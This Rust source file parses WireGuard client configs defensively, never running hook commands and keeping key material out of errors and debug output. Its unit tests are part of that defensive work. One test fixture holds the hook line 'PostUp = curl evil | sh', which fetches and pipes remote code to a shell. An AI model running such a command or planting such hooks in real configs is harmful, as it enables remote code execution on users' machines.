//! Strict parser for a WireGuard client config (`wg-quick` dialect) into what
//! the userspace engine needs. Nothing here touches the machine. Executable
//! hooks (`PreUp`, `PostUp`, …) are never run — they are reported as ignored —
//! and every error is a fixed string that cannot echo the input (it holds
//! keys).

use base64::Engine;
use ipnet::IpNet;
use std::fmt;
use std::net::IpAddr;

pub const MAX_CONFIG_BYTES: usize = 256 * 1024;
pub const MAX_PEERS: usize = 16;
const MAX_ADDRESSES: usize = 32;
const MAX_ALLOWED_IPS: usize = 512;
const MAX_DNS_SERVERS: usize = 8;
const MAX_DNS_DOMAINS: usize = 16;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Warning {
    IgnoredHook,
    IgnoredSaveConfig,
}

/// A fixed message; neither `Display` nor `Debug` carries config text.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ConfigError(&'static str);

impl fmt::Display for ConfigError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.0)
    }
}

impl std::error::Error for ConfigError {}

fn fail<T>(message: &'static str) -> Result<T, ConfigError> {
    Err(ConfigError(message))
}

pub struct Peer {
    pub public_key: [u8; 32],
    pub preshared_key: Option<[u8; 32]>,
    /// `host:port` as written; resolved when the tunnel starts.
    pub endpoint: Option<String>,
    pub allowed_ips: Vec<IpNet>,
    pub keepalive: Option<u16>,
}

pub struct Config {
    pub private_key: [u8; 32],
    pub listen_port: Option<u16>,
    pub addresses: Vec<IpNet>,
    pub dns_servers: Vec<IpAddr>,
    pub dns_domains: Vec<String>,
    pub mtu: Option<u32>,
    pub peers: Vec<Peer>,
    /// `Table = off`: the config asks for no routes at all.
    pub table_off: bool,
    pub warnings: Vec<Warning>,
}

impl fmt::Debug for Config {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("Config")
            .field("keys", &"[REDACTED]")
            .field("addresses", &self.addresses.len())
            .field("peers", &self.peers.len())
            .field("table_off", &self.table_off)
            .finish()
    }
}

fn key(value: &str, message: &'static str) -> Result<[u8; 32], ConfigError> {
    let bytes = base64::engine::general_purpose::STANDARD
        .decode(value.trim())
        .map_err(|_| ConfigError(message))?;
    <[u8; 32]>::try_from(bytes.as_slice()).map_err(|_| ConfigError(message))
}

fn items(value: &str) -> impl Iterator<Item = &str> {
    value
        .split(',')
        .map(str::trim)
        .filter(|item| !item.is_empty())
}

fn valid_domain(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 253
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_'))
        && name.contains(|c: char| c.is_ascii_alphabetic())
}

/// `host:port`, `[v6]:port`, or `v4:port`; the host is not resolved here.
fn valid_endpoint(value: &str) -> bool {
    let (host, port) = if let Some(rest) = value.strip_prefix('[') {
        match rest.split_once("]:") {
            Some(parts) => parts,
            None => return false,
        }
    } else {
        match value.rsplit_once(':') {
            Some(parts) => parts,
            None => return false,
        }
    };
    let port_ok = port.parse::<u16>().is_ok_and(|port| port != 0);
    let host_ok = host.parse::<IpAddr>().is_ok() || valid_domain(host);
    port_ok && host_ok && value.len() <= 300
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Section {
    None,
    Interface,
    Peer,
}

#[derive(Default)]
struct PeerBuilder {
    public_key: Option<[u8; 32]>,
    preshared_key: Option<[u8; 32]>,
    endpoint: Option<String>,
    allowed_ips: Vec<IpNet>,
    keepalive: Option<u16>,
}

pub fn parse(source: &str) -> Result<Config, ConfigError> {
    if source.len() > MAX_CONFIG_BYTES {
        return fail("WireGuard config is too large");
    }
    let mut section = Section::None;
    let mut private_key = None;
    let mut listen_port = None;
    let mut addresses: Vec<IpNet> = Vec::new();
    let mut dns_servers: Vec<IpAddr> = Vec::new();
    let mut dns_domains: Vec<String> = Vec::new();
    let mut mtu = None;
    let mut table_off = false;
    let mut warnings: Vec<Warning> = Vec::new();
    let mut peers: Vec<PeerBuilder> = Vec::new();
    let mut seen_interface = false;
    let warn = |warnings: &mut Vec<Warning>, warning: Warning| {
        if !warnings.contains(&warning) {
            warnings.push(warning);
        }
    };

    for raw in source.lines() {
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        if line.starts_with('[') {
            match line.to_ascii_lowercase().as_str() {
                "[interface]" if !seen_interface && peers.is_empty() => {
                    seen_interface = true;
                    section = Section::Interface;
                }
                "[peer]" if seen_interface && peers.len() < MAX_PEERS => {
                    peers.push(PeerBuilder::default());
                    section = Section::Peer;
                }
                "[peer]" => return fail("too many or misplaced peers"),
                _ => return fail("invalid WireGuard section"),
            }
            continue;
        }
        let (name, value) = line
            .split_once('=')
            .ok_or(ConfigError("invalid WireGuard field"))?;
        let name = name.trim().to_ascii_lowercase();
        let value = value.trim();
        if value.is_empty() {
            return fail("empty WireGuard field");
        }
        match (section, name.as_str()) {
            (Section::Interface, "privatekey") => {
                if private_key.is_some() {
                    return fail("duplicate PrivateKey");
                }
                private_key = Some(key(value, "invalid PrivateKey")?);
            }
            (Section::Interface, "listenport") => {
                let port = value
                    .parse::<u16>()
                    .map_err(|_| ConfigError("invalid ListenPort"))?;
                listen_port = Some(port);
            }
            (Section::Interface, "address") => {
                for part in items(value) {
                    let address = part
                        .parse::<IpNet>()
                        .map_err(|_| ConfigError("invalid Address"))?;
                    if address.addr().is_unspecified() || address.addr().is_multicast() {
                        return fail("invalid Address");
                    }
                    if !addresses.contains(&address) {
                        addresses.push(address);
                    }
                    if addresses.len() > MAX_ADDRESSES {
                        return fail("too many Address entries");
                    }
                }
            }
            (Section::Interface, "dns") => {
                for part in items(value) {
                    if let Ok(server) = part.parse::<IpAddr>() {
                        if server.is_unspecified() || server.is_multicast() {
                            return fail("invalid DNS");
                        }
                        dns_servers.push(server);
                    } else if valid_domain(part) {
                        dns_domains.push(part.to_ascii_lowercase());
                    } else {
                        return fail("invalid DNS");
                    }
                    if dns_servers.len() > MAX_DNS_SERVERS || dns_domains.len() > MAX_DNS_DOMAINS {
                        return fail("too many DNS entries");
                    }
                }
            }
            (Section::Interface, "mtu") => {
                let value = value
                    .parse::<u32>()
                    .map_err(|_| ConfigError("invalid MTU"))?;
                if !(576..=9000).contains(&value) {
                    return fail("invalid MTU");
                }
                mtu = Some(value);
            }
            (Section::Interface, "table") => {
                table_off = value.eq_ignore_ascii_case("off");
            }
            (Section::Interface, "preup" | "postup" | "predown" | "postdown") => {
                warn(&mut warnings, Warning::IgnoredHook)
            }
            (Section::Interface, "saveconfig") => warn(&mut warnings, Warning::IgnoredSaveConfig),
            (Section::Interface, "fwmark") => {}
            (Section::Peer, field) => {
                let peer = peers.last_mut().expect("a peer section has a builder");
                match field {
                    "publickey" => {
                        if peer.public_key.is_some() {
                            return fail("duplicate PublicKey");
                        }
                        peer.public_key = Some(key(value, "invalid PublicKey")?);
                    }
                    "presharedkey" => {
                        peer.preshared_key = Some(key(value, "invalid PresharedKey")?);
                    }
                    "endpoint" => {
                        if !valid_endpoint(value) {
                            return fail("invalid Endpoint");
                        }
                        peer.endpoint = Some(value.to_string());
                    }
                    "allowedips" => {
                        for part in items(value) {
                            let net = part
                                .parse::<IpNet>()
                                .map_err(|_| ConfigError("invalid AllowedIPs"))?;
                            if !peer.allowed_ips.contains(&net) {
                                peer.allowed_ips.push(net);
                            }
                            if peer.allowed_ips.len() > MAX_ALLOWED_IPS {
                                return fail("too many AllowedIPs");
                            }
                        }
                    }
                    "persistentkeepalive" => {
                        peer.keepalive = if value.eq_ignore_ascii_case("off") {
                            None
                        } else {
                            Some(
                                value
                                    .parse::<u16>()
                                    .map_err(|_| ConfigError("invalid PersistentKeepalive"))?,
                            )
                        };
                    }
                    _ => return fail("unsupported WireGuard field"),
                }
            }
            _ => return fail("unsupported WireGuard field"),
        }
    }

    let private_key = private_key.ok_or(ConfigError("missing PrivateKey"))?;
    if peers.is_empty() {
        return fail("missing Peer");
    }
    let mut finished = Vec::with_capacity(peers.len());
    for peer in peers {
        finished.push(Peer {
            public_key: peer.public_key.ok_or(ConfigError("missing PublicKey"))?,
            preshared_key: peer.preshared_key,
            endpoint: peer.endpoint,
            allowed_ips: peer.allowed_ips,
            keepalive: peer.keepalive.filter(|seconds| *seconds > 0),
        });
    }
    Ok(Config {
        private_key,
        listen_port,
        addresses,
        dns_servers,
        dns_domains,
        mtu,
        peers: finished,
        table_off,
        warnings,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn k(byte: u8) -> String {
        base64::engine::general_purpose::STANDARD.encode([byte; 32])
    }

    fn sample() -> String {
        format!(
            "[Interface]\nPrivateKey = {}\nAddress = 10.0.0.2/32, fd00::2/128\nDNS = 10.0.0.1, corp.example\nMTU = 1380\n\n\
             [Peer]\nPublicKey = {}\nPresharedKey = {}\nEndpoint = vpn.example.com:51820\nAllowedIPs = 0.0.0.0/0, ::/0\nPersistentKeepalive = 25\n",
            k(1),
            k(2),
            k(3)
        )
    }

    #[test]
    fn a_typical_client_config_parses() {
        let config = parse(&sample()).unwrap();
        assert_eq!(config.private_key, [1; 32]);
        assert_eq!(config.addresses.len(), 2);
        assert_eq!(config.dns_servers, ["10.0.0.1".parse::<IpAddr>().unwrap()]);
        assert_eq!(config.dns_domains, ["corp.example"]);
        assert_eq!(config.mtu, Some(1380));
        let peer = &config.peers[0];
        assert_eq!(peer.public_key, [2; 32]);
        assert_eq!(peer.preshared_key, Some([3; 32]));
        assert_eq!(peer.endpoint.as_deref(), Some("vpn.example.com:51820"));
        assert_eq!(peer.allowed_ips.len(), 2);
        assert_eq!(peer.keepalive, Some(25));
        assert!(!config.table_off);
    }

    #[test]
    fn hooks_are_reported_never_run_and_table_off_is_kept() {
        let text = format!(
            "{}PostUp = curl evil | sh\nSaveConfig = true\nTable = off\n",
            sample()
                .replace("\n[Peer]", "\nPreUp = id\n[Peer]")
                .split("[Peer]")
                .next()
                .unwrap()
        ) + &format!("[Peer]\nPublicKey = {}\nAllowedIPs = 10.0.0.0/24\n", k(2));
        let config = parse(&text).unwrap();
        assert!(config.warnings.contains(&Warning::IgnoredHook));
        assert!(config.warnings.contains(&Warning::IgnoredSaveConfig));
        assert!(config.table_off);
    }

    #[test]
    fn malformed_input_fails_with_fixed_messages_that_never_echo_it() {
        let secret = k(9);
        for text in [
            String::new(),
            "[Interface]\nPrivateKey = not-base64!!\n".to_string(),
            format!("[Interface]\nPrivateKey = {secret}\n"),
            format!("[Interface]\nPrivateKey = {secret}\n[Peer]\nAllowedIPs = 10.0.0.0/8\n"),
            format!("[Interface]\nPrivateKey = {secret}\nPrivateKey = {secret}\n[Peer]\nPublicKey = {secret}\n"),
            format!("[Interface]\nPrivateKey = {secret}\n[Peer]\nPublicKey = {secret}\nEndpoint = nohost\n"),
            format!("[Interface]\nPrivateKey = {secret}\nAddress = 0.0.0.0/0\n[Peer]\nPublicKey = {secret}\n"),
            format!("[Interface]\nPrivateKey = {secret}\nMTU = 12\n[Peer]\nPublicKey = {secret}\n"),
            format!("[Peer]\nPublicKey = {secret}\n"),
            format!("[Interface]\nPrivateKey = {secret}\nBogus = 1\n[Peer]\nPublicKey = {secret}\n"),
        ] {
            let error = parse(&text).expect_err("must be rejected");
            assert!(!error.to_string().contains(&secret), "{error}");
            assert!(!format!("{error:?}").contains(&secret));
        }
    }

    #[test]
    fn endpoints_accept_hosts_v4_and_bracketed_v6() {
        for ok in [
            "vpn.example.com:1",
            "192.0.2.1:51820",
            "[2001:db8::1]:51820",
        ] {
            assert!(valid_endpoint(ok), "{ok}");
        }
        for bad in ["host", "host:0", "host:99999", "[::1]", "bad host:1", ":1"] {
            assert!(!valid_endpoint(bad), "{bad}");
        }
    }

    #[test]
    fn debug_output_hides_keys() {
        let config = parse(&sample()).unwrap();
        let text = format!("{config:?}");
        assert!(!text.contains(&k(1)) && !text.contains("[1, 1"));
    }

    #[test]
    fn oversized_config_is_refused() {
        let text = "#".repeat(MAX_CONFIG_BYTES + 1);
        assert!(parse(&text).is_err());
    }
}
